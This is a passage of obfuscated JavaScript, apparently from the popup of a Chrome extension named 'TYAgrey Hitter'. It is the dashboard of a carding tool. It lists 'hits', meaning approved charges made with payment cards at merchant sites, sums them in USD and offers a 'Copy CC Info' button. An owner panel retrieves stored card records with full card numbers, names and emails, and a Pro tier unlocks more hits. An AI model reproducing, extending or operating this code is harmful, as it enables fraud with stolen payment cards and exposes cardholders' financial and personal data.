          _0x4e5706 = "TYAgrey Hitter";
          _0x36859d = "icons/icon128.png";
        }
        if (_0x223a30) {
          _0x43d84a = _0x223a30.rank;
          _0x4c76ca = _0x223a30.hits || 0;
        } else if (_0x4e702f !== null) {
          _0x43d84a = _0x4e702f;
          _0x4c76ca = _0x86cb6f;
        }
        if (_0x43d84a !== null) {
          _0x3bb516.textContent = "#" + _0x43d84a;
          _0x3bb516.className = "rank-badge " + (_0x43d84a <= 3 ? "rank-" + _0x43d84a : "rank-default");
          var _0x333c06 = _0x1d3308("statsFooterPfpWrap");
          _0x333c06.innerHTML = "<img class=\"hitter-pfp\" src=\"icons/icon128.png\" alt=\"\" style=\"display:block;\">";
          _0x165a35.textContent = _0x4e5706;
          _0x29b0d3.textContent = _0x4c76ca;
          _0x5a040c.style.display = "flex";
        } else {
          _0x5a040c.style.display = "none";
        }
      });
    }
    function _0x5a406a() {
      _0x36f16d = true;
      var _0x3a8986 = _0x1d3308("myhitsList");
      var _0x413b90 = _0x1d3308("myhitsTotalUsd");
      var _0x48bf4c = _0x1d3308("myhitsTotalPill");
      var _0x267a63 = [];
      var _0x31dcec = null;
      function _0x661186(_0x2ef492, _0x792528) {
        if (!_0x413b90) {
          return;
        }
        _0x413b90.textContent = _0x2ef492 || "$0.00";
        if (_0x48bf4c && _0x792528) {
          _0x48bf4c.title = _0x792528;
        }
      }
      function _0x3d3542() {
        if (_0x3a8986) {
          _0x3a8986.classList.remove("refreshing");
        }
        if (_0x48bf4c) {
          _0x48bf4c.classList.remove("refreshing");
        }
      }
      function _0x2656e5() {
        if (_0x5b9a10 && _0x3a8986 && _0x3a8986.querySelector(".myhits-hit-card")) {
          _0x3a8986.classList.add("refreshing");
          if (_0x48bf4c) {
            _0x48bf4c.classList.add("refreshing");
            _0x48bf4c.title = "Refreshing your total hit amount…";
          }
          return;
        }
        _0x661186("Loading...", "Loading your total hit amount…");
        _0x3a8986.innerHTML = "<div class=\"myhits-empty\"><svg viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><circle cx=\"12\" cy=\"12\" r=\"10\"/><path d=\"M12 6v6l4 2\"/></svg><p>Loading hits...</p></div>";
      }
      function _0xa471fc(_0x9784ef) {
        if (!_0x9784ef || typeof _0x9784ef !== "object") {
          return false;
        }
        var _0x334ea8 = String(_0x9784ef.status || "").toLowerCase();
        var _0x115970 = String(_0x9784ef.code || "").toUpperCase();
        if (_0x334ea8 === "success" || _0x334ea8 === "approved" || _0x334ea8 === "charged") {
          return true;
        }
        if (_0x115970 === "APPROVED" || _0x115970 === "SUCCESS" || _0x115970 === "CHARGED") {
          return true;
        }
        return false;
      }
      function _0x59262f(_0x24e4ac) {
        if (!_0x24e4ac || typeof _0x24e4ac !== "object") {
          return null;
        }
        function _0x44ce89(_0x100331, _0xc9ccdc) {
          var _0x363a18 = (_0xc9ccdc || "").toString().trim().toLowerCase();
          if (_0x363a18) {
            return _0x363a18;
          }
          if (!_0x100331) {
            return "";
          }
          var _0x180339 = String(_0x100331).trim();
          var _0x22b000 = _0x180339.match(/\b([A-Za-z]{3})\b/);
          if (_0x22b000 && _0x22b000[1]) {
            return _0x22b000[1].toLowerCase();
          }
          if (_0x180339.indexOf("€") !== -1) {
            return "eur";
          }
          if (_0x180339.indexOf("£") !== -1) {
            return "gbp";
          }
          if (_0x180339.indexOf("₹") !== -1) {
            return "inr";
          }
          if (_0x180339.indexOf("₽") !== -1) {
            return "rub";
          }
          if (_0x180339.indexOf("₩") !== -1) {
            return "krw";
          }
          if (_0x180339.indexOf("¥") !== -1) {
            return "jpy";
          }
          if (_0x180339.indexOf("$") !== -1) {
            return "usd";
          }
          return "";
        }
        var _0x169741 = {
          status: _0x24e4ac.status || "success",
          code: _0x24e4ac.code || "APPROVED",
          site: _0x24e4ac.site || _0x24e4ac.merchant || _0x24e4ac.site_name || "N/A",
          card_info: _0x24e4ac.card_info || _0x24e4ac.card || _0x24e4ac.cc || "****|**|**|***",
          amount: _0x24e4ac.amount || "",
          currency: _0x44ce89(_0x24e4ac.amount, _0x24e4ac.currency || _0x24e4ac.curr || _0x24e4ac.currency_code || ""),
          created_at: _0x24e4ac.created_at || _0x24e4ac.time || _0x24e4ac.charged_date || (_0x24e4ac.timestamp ? new Date(_0x24e4ac.timestamp).toISOString() : new Date().toISOString()),
          timestamp: _0x24e4ac.timestamp || Date.now(),
          hit_key: _0x24e4ac.hit_key || _0x24e4ac.hitKey || _0x24e4ac.key || ""
        };
        if (_0xa471fc(_0x169741)) {
          return _0x169741;
        } else {
          return null;
        }
      }
      function _0x5d061b(_0x1dceb8) {
        if (_0x1dceb8 === null || _0x1dceb8 === undefined) {
          return null;
        }
        var _0x1661ea = String(_0x1dceb8).trim();
        if (!_0x1661ea) {
          return null;
        }
        _0x1661ea = _0x1661ea.replace(/[^\d.,-]/g, "");
        if (!_0x1661ea) {
          return null;
        }
        var _0x3ec068 = Number(_0x1661ea.replace(/,/g, ""));
        if (isNaN(_0x3ec068) || !isFinite(_0x3ec068)) {
          return null;
        }
        return _0x3ec068;
      }
      function _0xc15521(_0x50eb80) {
        try {
          if (typeof Intl !== "undefined" && Intl.NumberFormat) {
            return new Intl.NumberFormat(undefined, {
              style: "currency",
              currency: "USD"
            }).format(_0x50eb80 || 0);
          }
        } catch (_0x2c8aac) {}
        return "$" + (_0x50eb80 || 0).toFixed(2);
      }
      function _0x1683f3(_0x5143e4) {
        chrome.storage.local.get(["tya_fx_rates_usd", "tya_fx_rates_ts"], function (_0x1b8aa3) {
          _0x5143e4(_0x1b8aa3.tya_fx_rates_usd || null, _0x1b8aa3.tya_fx_rates_ts || 0);
        });
      }
      function _0x3841de(_0x5c3192) {
        chrome.storage.local.set({
          tya_fx_rates_usd: _0x5c3192 || null,
          tya_fx_rates_ts: Date.now()
        });
      }
      function _0x13d58e(_0x4cdf77) {
        _0x1683f3(function (_0x128a04, _0x1a0523) {
          var _0xfb10d6 = _0x128a04 && _0x1a0523 && Date.now() - _0x1a0523 < 86400000;
          if (_0xfb10d6) {
            _0x4cdf77(_0x128a04, true);
            return;
          }
          fetch("https://open.er-api.com/v6/latest/USD").then(function (_0x15dca7) {
            return _0x15dca7.json();
          }).then(function (_0x1564ae) {
            var _0x559048 = _0x1564ae && _0x1564ae.rates ? _0x1564ae.rates : null;
            if (_0x559048 && typeof _0x559048 === "object") {
              _0x3841de(_0x559048);
              _0x4cdf77(_0x559048, false);
            } else {
              _0x4cdf77(_0x128a04 || null, false);
            }
          }).catch(function () {
            _0x4cdf77(_0x128a04 || null, false);
          });
        });
      }
      function _0x79695f(_0x522075, _0xa1712) {
        _0x522075 = Array.isArray(_0x522075) ? _0x522075 : [];
        _0x13d58e(function (_0x59ccb5) {
          var _0x232d21 = 0;
          var _0x10c7f4 = 0;
          var _0x1d7dfc = 0;
          var _0x21d861 = 0;
          for (var _0x8ad474 = 0; _0x8ad474 < _0x522075.length; _0x8ad474++) {
            var _0x10916a = _0x522075[_0x8ad474];
            if (!_0x10916a) {
              continue;
            }
            var _0x14f145 = _0x5d061b(_0x10916a.amount);
            if (_0x14f145 === null) {
              _0x1d7dfc++;
              continue;
            }
            var _0x387da7 = (_0x10916a.currency || "usd").toString().trim().toUpperCase() || "USD";
            if (_0x387da7 === "USD") {
              _0x232d21 += _0x14f145;
              _0x10c7f4++;
              continue;
            }
            if (_0x59ccb5 && _0x59ccb5[_0x387da7]) {
              var _0x20ad8c = _0x14f145 / Number(_0x59ccb5[_0x387da7]);
              if (!isNaN(_0x20ad8c) && isFinite(_0x20ad8c)) {
                _0x232d21 += _0x20ad8c;
                _0x10c7f4++;
              } else {
                _0x1d7dfc++;
              }
            } else {
              _0x21d861++;
            }
          }
          _0xa1712({
            total: _0x232d21,
            used: _0x10c7f4,
            skipped: _0x1d7dfc,
            nonUsdNoRate: _0x21d861
          });
        });
      }
      function _0x106063(_0x3764ac, _0x5e32ca) {
        if (_0x3764ac === null || _0x3764ac === undefined || _0x3764ac === "") {
          return "N/A";
        }
        var _0x241b13 = String(_0x3764ac).trim();
        if (!_0x241b13) {
          return "N/A";
        }
        if (/[A-Za-z]{3}/.test(_0x241b13) || /[$€£¥₹₽₩₺₫฿₴₦₲₪₱₵₡₭₮₯₠₢₣₤₥₦₧₨₩₰₳₸₺₼₽₾]/.test(_0x241b13)) {
          return _0x241b13;
        }
        var _0xa13f25 = (_0x5e32ca || "").toString().trim().toUpperCase();
        var _0x2c458c = Number(_0x241b13.replace(/,/g, ""));
        var _0x1a90fc = !isNaN(_0x2c458c) && isFinite(_0x2c458c);
        if (_0xa13f25 && _0x1a90fc && typeof Intl !== "undefined" && Intl.NumberFormat) {
          try {
            return new Intl.NumberFormat(undefined, {
              style: "currency",
              currency: _0xa13f25
            }).format(_0x2c458c);
          } catch (_0x125ec1) {}
        }
        var _0x5bfca8 = {
          USD: "$",
          EUR: "€",
          GBP: "£",
          JPY: "¥",
          CNY: "¥",
          KRW: "₩",
          INR: "₹",
          RUB: "₽",
          TRY: "₺",
          BRL: "R$",
          CAD: "CA$",
          AUD: "A$",
          NZD: "NZ$",
          CHF: "CHF",
          SEK: "kr",
          NOK: "kr",
          DKK: "kr",
          PLN: "zł",
          CZK: "Kč",
          HUF: "Ft",
          ILS: "₪",
          AED: "د.إ",
          SAR: "﷼",
          QAR: "ر.ق",
          KWD: "د.ك",
          BHD: "د.ب",
          OMR: "ر.ع.",
          ZAR: "R",
          MXN: "$",
          ARS: "$",
          CLP: "$",
          COP: "$",
          PEN: "S/",
          VND: "₫",
          THB: "฿",
          MYR: "RM",
          SGD: "S$",
          HKD: "HK$",
          TWD: "NT$",
          IDR: "Rp",
          PHP: "₱",
          PKR: "₨",
          BDT: "৳",
          LKR: "Rs",
          NGN: "₦",
          EGP: "E£",
          MAD: "د.م.",
          TND: "د.ت",
          DZD: "دج",
          KES: "KSh",
          UGX: "USh",
          GHS: "GH₵"
        };
        if (_0xa13f25 && _0x5bfca8[_0xa13f25]) {
          return _0x5bfca8[_0xa13f25] + _0x241b13;
        }
        if (_0xa13f25) {
          return _0xa13f25 + " " + _0x241b13;
        }
        return "$" + _0x241b13;
      }
      function _0x4c8231(_0x452141) {
        if (!_0x452141) {
          return "";
        }
        if (_0x452141.hit_key) {
          return String(_0x452141.hit_key);
        }
        return [String(_0x452141.card_info || "").trim(), String(_0x452141.site || "").trim(), String(_0x452141.amount || "").trim(), String(_0x452141.currency || "").trim().toLowerCase(), String(_0x452141.status || "").trim().toLowerCase(), String(_0x452141.code || "").trim().toUpperCase()].join("|");
      }
      function _0x43a2a7(_0x2d9283) {
        var _0x59ba9e = Array.isArray(_0x2d9283) ? _0x2d9283 : [];
        var _0x2da493 = [];
        var _0x4c9041 = {};
        for (var _0x197e36 = 0; _0x197e36 < _0x59ba9e.length; _0x197e36++) {
          var _0x64d488 = _0x59ba9e[_0x197e36];
          var _0x5e1d61 = _0x4c8231(_0x64d488);
          if (!_0x5e1d61) {
            continue;
          }
          if (_0x4c9041[_0x5e1d61]) {
            continue;
          }
          _0x4c9041[_0x5e1d61] = true;
          _0x2da493.push(_0x64d488);
        }
        return _0x2da493;
      }
      function _0xe4c8b5(_0x1e3b20) {
        if (!Array.isArray(_0x1e3b20)) {
          return [];
        }
        return _0x43a2a7(_0x1e3b20.map(_0x59262f).filter(Boolean));
      }
      function _0x494fa5(_0x3be68d) {
        if (!_0x3be68d || typeof _0x3be68d !== "object") {
          return [];
        }
        if (Array.isArray(_0x3be68d.hits)) {
          return _0xe4c8b5(_0x3be68d.hits);
        }
        if (Array.isArray(_0x3be68d.history)) {
          return _0xe4c8b5(_0x3be68d.history);
        }
        if (_0x3be68d.data && Array.isArray(_0x3be68d.data.hits)) {
          return _0xe4c8b5(_0x3be68d.data.hits);
        }
        if (_0x3be68d.data && Array.isArray(_0x3be68d.data.history)) {
          return _0xe4c8b5(_0x3be68d.data.history);
        }
        if (Array.isArray(_0x3be68d.data)) {
          return _0xe4c8b5(_0x3be68d.data);
        }
        return [];
      }
      console.log("🔄 [POPUP-HITS] loadMyHits() called, token:", _0xc81f0 ? _0xc81f0.substring(0, 2) + "***" : "NONE");
      if (!_0xc81f0) {
        console.log("❌ [POPUP-HITS] No token found");
        _0x3a8986.innerHTML = "<div class=\"myhits-empty\"><svg viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path d=\"M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z\" /><path d=\"M12 8v8M8 12h8\" /></svg><p>Not authenticated</p></div>";
        return;
      }
      _0x2656e5();
      console.log("📡 [POPUP-HITS] Calling get-my-hits API");
      function _0xce4277(_0x4faa83, _0x467c07, _0x8d9e06, _0x1f4a65) {
        _0x4faa83 = _0xe4c8b5(_0x4faa83);
        _0x267a63 = _0x4faa83;
        if (_0x8d9e06) {
          _0x31dcec = _0x8d9e06;
        }
        if (!Array.isArray(_0x4faa83) || _0x4faa83.length === 0) {
          _0x661186("$0.00", "No hits to sum");
          if (_0x1f4a65) {
            _0x3a8986.innerHTML = "<div class=\"myhits-empty\"><svg viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><circle cx=\"12\" cy=\"12\" r=\"10\"/><path d=\"M12 6v6l4 2\"/></svg><p>No matching hits</p></div>";
          }
          return false;
        }
        try {
          _0x79695f(_0x4faa83, function (_0x4ddb1c) {
            var _0x1af5d2 = _0xc15521(_0x4ddb1c.total);
            var _0x30f2cb = "Converted to USD from displayed hits.";
            if (_0x4ddb1c.nonUsdNoRate > 0) {
              _0x30f2cb += " Some currencies could not be converted.";
            }
            _0x661186(_0x1af5d2, _0x30f2cb);
          });
        } catch (_0x4f9bc0) {}
        var _0x39ba46 = userRole === "user";
        var _0x49d4d9 = _0x8d9e06 && _0x8d9e06.limit ? _0x8d9e06.limit : _0x39ba46 ? 20 : 200;
        var _0x14788f = _0x8d9e06 && _0x8d9e06.total_hits ? _0x8d9e06.total_hits : _0x4faa83.length;
        var _0x3cc0e9 = "";
        if (!_0x1f4a65 && _0x39ba46) {
          _0x3cc0e9 += "<div style=\"background:rgba(14,165,233,.08);border:1px solid rgba(14,165,233,.2);border-radius:8px;padding:8px 12px;margin-bottom:10px;font-size:11px;color:var(--accent);\">💡 Normal users can view up to " + _0x49d4d9 + " hits. Upgrade to Pro for 200+. <span style=\"font-weight:700\">" + _0x4faa83.length + "/" + _0x49d4d9 + "</span> shown.</div>";
        }
        if (_0x1f4a65) {
          _0x3cc0e9 += "<div style=\"margin-bottom:10px;font-size:11px;color:var(--text-muted);\">Showing " + _0x4faa83.length + " result" + (_0x4faa83.length === 1 ? "" : "s") + "</div>";
        }
        _0x4faa83.forEach(function (_0x111a49, _0x505b0f) {
          var _0x503068 = _0x111a49.status || "success";
          var _0x160fec = _0x111a49.site || _0x111a49.merchant || "N/A";
          var _0x2ab0bf = _0x111a49.code || "APPROVED";
          var _0x576d24 = _0x111a49.card_info || _0x111a49.card || "****|**|**|***";
          var _0x32b449 = _0x111a49.amount || "";
          var _0x5b9e22 = _0x111a49.currency || "";
          var _0x1bd18d = _0x111a49.created_at || _0x111a49.time || "N/A";
          var _0x10cfc5 = _0x2ab0bf === "APPROVED" || _0x503068 === "success";
          var _0xf4d25e = "charged";
          var _0x500004 = _0x10cfc5 ? "🎉 HIT SUCCESS🔥" : String(_0x503068 || "").toUpperCase();
          var _0x5cd03f = _0x1bd18d;
          if (_0x1bd18d && _0x1bd18d !== "N/A" && !isNaN(Date.parse(_0x1bd18d))) {
            var _0x40cc50 = new Date(_0x1bd18d);
            _0x5cd03f = _0x40cc50.getMonth() + 1 + "/" + _0x40cc50.getDate() + "/" + _0x40cc50.getFullYear() + ", " + (_0x40cc50.getHours() % 12 || 12) + ":" + String(_0x40cc50.getMinutes()).padStart(2, "0") + (_0x40cc50.getHours() >= 12 ? " PM" : " AM");
          }
          _0x3cc0e9 += "<div class=\"myhits-hit-card " + _0xf4d25e + "\"><div class=\"myhits-hit-header\"><div class=\"myhits-hit-status\">" + _0x3b7b71(_0x500004) + "</div><div class=\"myhits-hit-badge" + (_0x10cfc5 ? "" : " declined") + "\">" + _0x3b7b71(_0x2ab0bf) + "</div>" + (_0x39ba46 ? "" : "<button class=\"myhits-copy-btn\" data-copy=\"" + _0x4db7b6(_0x576d24) + "\" title=\"Copy CC Info\"><svg viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path d=\"M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2\"></path><rect x=\"8\" y=\"2\" width=\"8\" height=\"4\" rx=\"1\" ry=\"1\"></rect></svg></button>") + "</div><div class=\"myhits-hit-row\"><div class=\"myhits-hit-label\">Site:</div><div class=\"myhits-hit-value site-link\">" + _0x3b7b71(_0x160fec) + "</div></div><div class=\"myhits-hit-row\"><div class=\"myhits-hit-label\">Card:</div><div class=\"myhits-hit-value\">" + _0x3b7b71(_0x576d24) + "</div></div><div class=\"myhits-hit-row\"><div class=\"myhits-hit-label\">Amount:</div><div class=\"myhits-hit-value amount\">" + _0x3b7b71(_0x106063(_0x32b449, _0x5b9e22)) + "</div></div><div class=\"myhits-hit-row\"><div class=\"myhits-hit-label\">Time:</div><div class=\"myhits-hit-value\">" + _0x3b7b71(_0x5cd03f) + "</div></div></div>";
        });
        _0x3a8986.innerHTML = _0x3cc0e9;
        if (!_0x39ba46) {
          var _0x19327f = _0x3a8986.querySelectorAll(".myhits-copy-btn");
          _0x19327f.forEach(function (_0x212e63) {
            _0x212e63.addEventListener("click", function () {
              var _0x406711 = _0x212e63.getAttribute("data-copy");
              _0x3db187(_0x406711, _0x212e63);
            });
          });
        }
        console.log("✅ [POPUP-HITS] Displayed " + _0x4faa83.length + " hits" + (_0x467c07 ? " from " + _0x467c07 : ""));
        return true;
      }
      var _0x43a9d = _0x1d3308("myhitsSearchInput");
      var _0x418311 = _0x1d3308("myhitsSearchClear");
      var _0x5f3494 = _0x1d3308("myhitsSearchCount");
      function _0x5b654f(_0x31f9ad) {
        if (!_0x267a63) {
          return;
        }
        _0x31f9ad = String(_0x31f9ad || "").trim().toLowerCase();
        if (!_0x31f9ad) {
          _0xce4277(_0x267a63, "reset", _0x31dcec);
          if (_0x5f3494) {
            _0x5f3494.textContent = "";
          }
          if (_0x418311) {
            _0x418311.style.display = "none";
          }
          return;
        }
        var _0x4e60da = _0x267a63.filter(function (_0x33ea35) {
          var _0x49ec50 = String(_0x33ea35.site || "").toLowerCase();
          var _0x12e4ba = String(_0x33ea35.card_info || "").toLowerCase();
          var _0x2770c2 = String(_0x33ea35.amount || "").toLowerCase();
          var _0xef8da9 = String(_0x33ea35.status || "").toLowerCase();
          var _0x2cf34b = String(_0x33ea35.code || "").toUpperCase();
          return _0x49ec50.indexOf(_0x31f9ad) !== -1 || _0x12e4ba.indexOf(_0x31f9ad) !== -1 || _0x2770c2.indexOf(_0x31f9ad) !== -1 || _0xef8da9.indexOf(_0x31f9ad) !== -1 || _0x2cf34b.indexOf(_0x31f9ad) !== -1;
        });
        _0xce4277(_0x4e60da, "search", _0x31dcec, true);
        if (_0x5f3494) {
          _0x5f3494.textContent = _0x4e60da.length + " result" + (_0x4e60da.length === 1 ? "" : "s");
        }
        if (_0x418311) {
          _0x418311.style.display = "flex";
        }
      }
      if (_0x43a9d) {
        _0x43a9d.addEventListener("input", function () {
          _0x5b654f(this.value);
        });
      }
      if (_0x418311) {
        _0x418311.addEventListener("click", function () {
          if (_0x43a9d) {
            _0x43a9d.value = "";
            _0x43a9d.focus();
          }
          _0x5b654f("");
        });
      }
      function _0x1c3f1e(_0xd4d7a8) {
        if (_0x5b9a10) {
          _0x3d3542();
          if (_0x413b90) {
            _0x48bf4c.title = _0xd4d7a8 || "Keeping current hits until refresh completes.";
          }
          return;
        }
        chrome.storage.local.get(["tyagrey_my_hits_cache", "tya_local_history"], function (_0x4bc3e7) {
          var _0x453ad5 = _0xe4c8b5(_0x4bc3e7.tyagrey_my_hits_cache);
          var _0x447549 = _0xe4c8b5(_0x4bc3e7.tya_local_history);
          var _0x1b9199 = _0x43a2a7(_0x453ad5.concat(_0x447549));
          var _0x36ddf6 = _0x1b9199.sort(function (_0x3d25f6, _0x227159) {
            var _0x85d798 = new Date(_0x3d25f6.created_at || 0).getTime() || 0;
            var _0x675e64 = new Date(_0x227159.created_at || 0).getTime() || 0;
            return _0x675e64 - _0x85d798;
          }).slice(0, 100);
          try {
            if (_0x36ddf6 && _0x36ddf6.length) {
              _0x79695f(_0x36ddf6, function (_0x142df) {
                var _0x359b01 = _0xc15521(_0x142df.total);
                var _0x5d8810 = "Converted to USD from local cache hits.";
                if (_0x142df.nonUsdNoRate > 0) {
                  _0x5d8810 += " Some currencies could not be converted.";
                }
                _0x661186(_0x359b01, _0x5d8810);
              });
            } else {
              _0x661186("$0.00", "No hits to sum");
            }
          } catch (_0x5dd726) {}
          if (_0xce4277(_0x36ddf6, "local cache")) {
            return;
          }
          _0x3a8986.innerHTML = "<div class=\"myhits-empty\"><svg viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path d=\"M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z\" /><path d=\"M12 8v8M8 12h8\" /></svg><p>" + _0x3b7b71(_0xd4d7a8 || "No hits available yet") + "</p></div>";
        });
      }
      var _0x4e5cb2 = false;
      var _0x50af7a = null;
      if (!_0x5b9a10) {
        _0x50af7a = setTimeout(function () {
          _0x4e5cb2 = true;
          _0x1c3f1e("Loading cloud hits, showing local cache");
        }, 650);
      }
      _0x59e7fa("get-my-hits", {
        token: _0xc81f0
      }).then(function (_0x2ea32d) {
        console.log("📊 [POPUP-HITS] API Response:", _0x2ea32d);
        clearTimeout(_0x50af7a);
        if (!_0x2ea32d.success) {
          console.log("❌ [POPUP-HITS] API returned error:", _0x2ea32d.message);
          if (!_0x4e5cb2) {
            _0x1c3f1e("Error loading hits, showing local cache if available");
          }
          return;
        }
        var _0x20ca12 = _0x494fa5(_0x2ea32d);
        var _0x1122a7 = {
          limit: _0x2ea32d.limit,
          total_hits: _0x2ea32d.total_hits,
          role: _0x2ea32d.role
        };
        console.log("✅ [POPUP-HITS] Got " + _0x20ca12.length + " hits from database. Role: " + (_0x1122a7.role || userRole) + ", Limit: " + _0x1122a7.limit);
        if (_0x20ca12.length === 0) {
          console.log("⚠️ [POPUP-HITS] No hits found in database");
          if (!_0x4e5cb2) {
            _0x1c3f1e("No hits found on server, showing local cache if available");
          }
          return;
        }
        chrome.storage.local.set({
          tyagrey_my_hits_cache: _0x43a2a7(_0x20ca12).slice(0, 100)
        });
        _0x3d3542();
        if (_0xce4277(_0x20ca12, "server", _0x1122a7)) {
          _0x5b9a10 = true;
          chrome.storage.local.remove(["tyagrey_my_hits_cache", "tya_local_history"], function () {});
        } else if (!_0x4e5cb2) {
          _0x1c3f1e("No hits found, showing local cache if available");
        }
      }).catch(function (_0x14a8bc) {
        console.error("❌ [POPUP-HITS] Error loading hits:", _0x14a8bc);
        clearTimeout(_0x50af7a);
        _0x3d3542();
        if (!_0x4e5cb2) {
          _0x1c3f1e("Failed to load hits, showing local cache if available");
        }
      });
    }
    var _0xcdcff8 = false;
    var _0x5272c4 = [];
    var _0x2026e8 = [];
    function _0x87ed9e(_0x27ff24, _0x18adab) {
      var _0xd9bf72 = document.getElementById("ownerStatusMsg");
      if (!_0xd9bf72) {
        return;
      }
      _0xd9bf72.textContent = _0x27ff24;
      _0xd9bf72.style.display = "";
      if (_0x18adab === "success") {
        _0xd9bf72.style.background = "rgba(16,185,129,0.15)";
        _0xd9bf72.style.color = "#10b981";
        _0xd9bf72.style.border = "1px solid rgba(16,185,129,0.3)";
      } else if (_0x18adab === "error") {
        _0xd9bf72.style.background = "rgba(239,68,68,0.15)";
        _0xd9bf72.style.color = "#ef4444";
        _0xd9bf72.style.border = "1px solid rgba(239,68,68,0.3)";
      } else {
        _0xd9bf72.style.background = "rgba(59,130,246,0.15)";
        _0xd9bf72.style.color = "#3b82f6";
        _0xd9bf72.style.border = "1px solid rgba(59,130,246,0.3)";
      }
      setTimeout(function () {
        _0xd9bf72.style.display = "none";
      }, 4000);
    }
    var _0x569894 = null;
    function _0x4f1941(_0x1841ca) {
      return new Promise(function (_0x5e4690) {
        var _0x301655 = document.getElementById("ownerConfirmBox");
        var _0x52a104 = document.getElementById("ownerConfirmText");
        if (!_0x301655 || !_0x52a104) {
          _0x5e4690(false);
          return;
        }
        _0x52a104.textContent = _0x1841ca || "Are you sure?";
        _0x301655.style.display = "";
        _0x569894 = _0x5e4690;
      });
    }
    document.getElementById("ownerConfirmYes").addEventListener("click", function () {
      if (_0x569894) {
        _0x569894(true);
        _0x569894 = null;
      }
      var _0x33ff7c = document.getElementById("ownerConfirmBox");
      if (_0x33ff7c) {
        _0x33ff7c.style.display = "none";
      }
    });
    document.getElementById("ownerConfirmNo").addEventListener("click", function () {
      if (_0x569894) {
        _0x569894(false);
        _0x569894 = null;
      }
      var _0x1f64f5 = document.getElementById("ownerConfirmBox");
      if (_0x1f64f5) {
        _0x1f64f5.style.display = "none";
      }
    });
    var _0x484e85 = null;
    function _0x554eb6(_0x551270) {
      return new Promise(function (_0x110a19) {
        var _0x3d66fe = document.getElementById("ownerPromptBox");
        var _0x1363ee = document.getElementById("ownerPromptText");
        var _0x582933 = document.getElementById("ownerPromptInput");
        if (!_0x3d66fe || !_0x1363ee || !_0x582933) {
          _0x110a19(null);
          return;
        }
        _0x1363ee.textContent = _0x551270 || "Enter value:";
        _0x582933.value = "";
        _0x3d66fe.style.display = "";
        _0x582933.focus();
        _0x484e85 = _0x110a19;
      });
    }
    document.getElementById("ownerPromptOk").addEventListener("click", function () {
      var _0x29e46b = document.getElementById("ownerPromptInput");
      if (_0x484e85) {
        _0x484e85(_0x29e46b ? _0x29e46b.value : null);
        _0x484e85 = null;
      }
      var _0x548ded = document.getElementById("ownerPromptBox");
      if (_0x548ded) {
        _0x548ded.style.display = "none";
      }
    });
    document.getElementById("ownerPromptCancel").addEventListener("click", function () {
      if (_0x484e85) {
        _0x484e85(null);
        _0x484e85 = null;
      }
      var _0x3c44ed = document.getElementById("ownerPromptBox");
      if (_0x3c44ed) {
        _0x3c44ed.style.display = "none";
      }
    });
    document.getElementById("ownerPromptInput").addEventListener("keydown", function (_0x2c8134) {
      if (_0x2c8134.key === "Enter") {
        document.getElementById("ownerPromptOk").click();
      }
      if (_0x2c8134.key === "Escape") {
        document.getElementById("ownerPromptCancel").click();
      }
    });
    function _0x5c5877() {
      if (_0xcdcff8) {
        return;
      }
      _0xcdcff8 = true;
      _0x6cb51();
      _0x35b66a();
      _0x2f7dae();
      _0x1d3feb();
      loadBinData();
    }
    function _0x35b66a() {
      if (!_0xc81f0) {
        return;
      }
      var _0x46c467 = document.getElementById("monthlyUserSelect");
      var _0x5e4496 = document.getElementById("customUserSelect");
      if (_0x46c467) {
        _0x46c467.innerHTML = "<option value=\"\">-- Loading users... --</option>";
      }
      if (_0x5e4496) {
        _0x5e4496.innerHTML = "<option value=\"\">-- Loading users... --</option>";
      }
      _0x59e7fa("get-all-users", {
        token: _0xc81f0
      }).then(function (_0x2a0510) {
        console.log("get-all-users response:", _0x2a0510);
        if (_0x2a0510 && _0x2a0510.success && Array.isArray(_0x2a0510.users)) {
          _0x2026e8 = _0x2a0510.users;
          _0x5285b5();
        } else {
          console.log("Failed to load users:", _0x2a0510);
          var _0x540267 = "<option value=\"\">-- Failed to load users --</option>";
          if (_0x46c467) {
            _0x46c467.innerHTML = _0x540267;
          }
          if (_0x5e4496) {
            _0x5e4496.innerHTML = _0x540267;
          }
        }
      }).catch(function (_0x46c3cf) {
        console.log("Error loading users:", _0x46c3cf);
        var _0x4bfb64 = "<option value=\"\">-- Error loading users --</option>";
        if (_0x46c467) {
          _0x46c467.innerHTML = _0x4bfb64;
        }
        if (_0x5e4496) {
          _0x5e4496.innerHTML = _0x4bfb64;
        }
      });
    }
    function _0x1d3feb() {
      if (!_0xc81f0) {
        return;
      }
      var _0x56acf7 = document.getElementById("ccRecordsList");
      if (_0x56acf7) {
        _0x56acf7.innerHTML = "<div class=\"owner-loading\">Loading...</div>";
      }
      _0x59e7fa("get-cc-records", {
        token: _0xc81f0,
        limit: 100
      }).then(function (_0x3b2ec8) {
        if (!_0x3b2ec8 || !_0x3b2ec8.success || !Array.isArray(_0x3b2ec8.records)) {
          if (_0x56acf7) {
            _0x56acf7.innerHTML = "<div class=\"owner-empty\">No CC records found</div>";
          }
          return;
        }
        window.ownerCcRecordsCache = _0x3b2ec8.records;
        if (_0x56acf7) {
          if (_0x3b2ec8.records.length === 0) {
            _0x56acf7.innerHTML = "<div class=\"owner-empty\">No records saved yet</div>";
          } else {
            _0x56acf7.innerHTML = _0x3b2ec8.records.map(function (_0x348cd4, _0x37c59a) {
              var _0x58d43b = _0x3b7b71(String(_0x348cd4.full_card_number || "****"));
              var _0x4bcacf = _0x348cd4.full_name ? _0x3b7b71(String(_0x348cd4.full_name)) : "";
              var _0x4e2320 = _0x348cd4.email ? _0x3b7b71(String(_0x348cd4.email)) : "";
              var _0x580112 = _0x4bcacf || _0x4e2320 || "Unknown";
